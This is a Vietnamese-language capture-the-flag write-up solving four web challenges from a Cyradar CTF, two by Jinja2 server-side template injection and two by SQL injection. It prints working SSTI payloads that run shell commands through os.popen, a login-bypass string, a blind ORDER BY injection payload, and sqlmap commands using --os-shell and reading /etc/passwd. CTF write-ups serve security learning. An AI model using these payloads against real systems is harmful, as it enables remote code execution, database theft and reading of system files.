---
title: "Write up Cyradar CTF TTS/CTV [WEB]"
date: "2025-01-05"
excerpt: "Write up Cyradar CTF TTS/CTV [WEB]"
featured: "/images/cyradar_logo.svg"
---

# Bài 1: SSTI

Khi mở web lên có giao diện như sau:

![image](https://hackmd.io/_uploads/S1FPYZO8Je.png)

=> Khả năng có 1 query string là `name`

Cho `name` có giá trị là `{{7*7}}` để test SSTI

=> Xuất hiện 49 => có khả năng bị SSTI

![image](https://hackmd.io/_uploads/ryg0FWOI1g.png)

Test tiếp `name` = `${{<%[%'"}}%\.` để biết xem phía server đang dùng template engine nào

![image](https://hackmd.io/_uploads/B1i3qW_Ikg.png)

=> Jinja2

Sử dụng payload: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
`

Phát hiện có flag.txt

![image](https://hackmd.io/_uploads/B1iApWdLyg.png)

Đọc flag.txt => `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}`

![image](https://hackmd.io/_uploads/BJeI0bO8kg.png)

Flag: `Hello CyWeb{w3b_3asy_sst1}!`


# Bài 2: SQL Injection

Bài 2 có giao diện như sau:

![image](https://hackmd.io/_uploads/B1HMyfdU1l.png)

Đọc source code => SQL Injection

Khi thử nhập username là `admin' or 1 = 1 -- thì bị thật`

![image](https://hackmd.io/_uploads/rJuvJzOIJg.png)

Tiếp theo sử dụng tool SQLMap để đẩy nhanh tiến độ dump db

Đầu tiên sử dụng Burp Suite vào url bài web, đăng nhập thử, sau đó lấy request đưa vào file `request.txt`

Sau đó sử dụng SQLMap như sau

![image](https://hackmd.io/_uploads/BkUhJGd8kg.png)

![image](https://hackmd.io/_uploads/H1901G_U1e.png)

Thấy được 3 database sau:

![image](https://hackmd.io/_uploads/HkhkeMOUJg.png)

Thử dump database public (`-dbs`)

![image](https://hackmd.io/_uploads/SyNZxzOLkg.png)

Khi dump table users thì không thấy flag (`-D public -T users --dump`)

![image](https://hackmd.io/_uploads/ryHEgzu81x.png)

Xem lại đề bài có vẻ gợi ý RCE

![image](https://hackmd.io/_uploads/HJNYef_I1e.png)

=> Thêm option `--os-shell` để RCE

![image](https://hackmd.io/_uploads/BJC9gfOUye.png)

Sau đó liệt kê thư mục gốc:

![image](https://hackmd.io/_uploads/rk-nlzdUyl.png)

Đọc file `flag.txt`

![image](https://hackmd.io/_uploads/Byr6lfOLkx.png)

Flag: `CyWeb{ThiS_i5_m3d!um5q1!r(3}`

# Bài 3: SSTI

![image](https://hackmd.io/_uploads/HyF5bfOIJl.png)

Server đang reflect lại địa chỉ IP của client.

Thử thêm `X-Forwarded-For` vào gói tin:

![image](https://hackmd.io/_uploads/Byx-GzOI1x.png)

=> Thử địa chỉ localhost nhưng không thấy gì

Thử `{{7*7}}` ra 49

![image](https://hackmd.io/_uploads/SkwVMzu8ke.png)

Tiếp tục 1 số bước như bài 1 => Jinja2 

Và chèn payload sau: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}`

![image](https://hackmd.io/_uploads/ByNifMu8kg.png)

Đọc flag.txt: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}`

![image](https://hackmd.io/_uploads/S1xpfMOLJx.png)

Flag: `CyWeb{m3d!umsst!}`

# Bài 4: SQL Injection

![image](https://hackmd.io/_uploads/S1j8Xf_8kl.png)

Có vẻ giống bài 2 nhưng lần này với query string `order_by`

Sử dụng sqlmap check 1 số database

![image](https://hackmd.io/_uploads/B1QlVGOUJe.png)

=> xem xét db `chh`

**Note**: 1 cách test bằng cơm nếu không dùng sqlmap: `?order_by=(SELECT (CASE WHEN ((SELECT substring(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='a') THEN 'price' ELSE (SELECT 7066 UNION SELECT 7211) END))
`

Phát hiện table flag

![image](https://hackmd.io/_uploads/HkiWVM_Lyg.png)

![image](https://hackmd.io/_uploads/ryPMEM_81l.png)

Tuy nhiên thì đây là flag fake
Sau đó có thử option `--os-shell` tuy nhiên gặp lỗi (khả năng không upload được file) => Không thể RCE được
Sau khi tìm hiểu thì có phát hiện ra sqlmap có thể đọc được file với `--file-read`

`sqlmap -r request.txt --file-read=/etc/passwd`

Đầu tiên đọc file `/etc/passwd` xem có flag không

![image](https://hackmd.io/_uploads/rkkZHf_L1x.png)

Em nghĩ lại thì flag các bài trước đều được đặt ở /flag.txt 

![image](https://hackmd.io/_uploads/rJVSHf_L1l.png)
![image](https://hackmd.io/_uploads/r1oHHG_UJg.png)

=> Flag: `CyWeb{w3b_h@rd_sql1_0rderby}`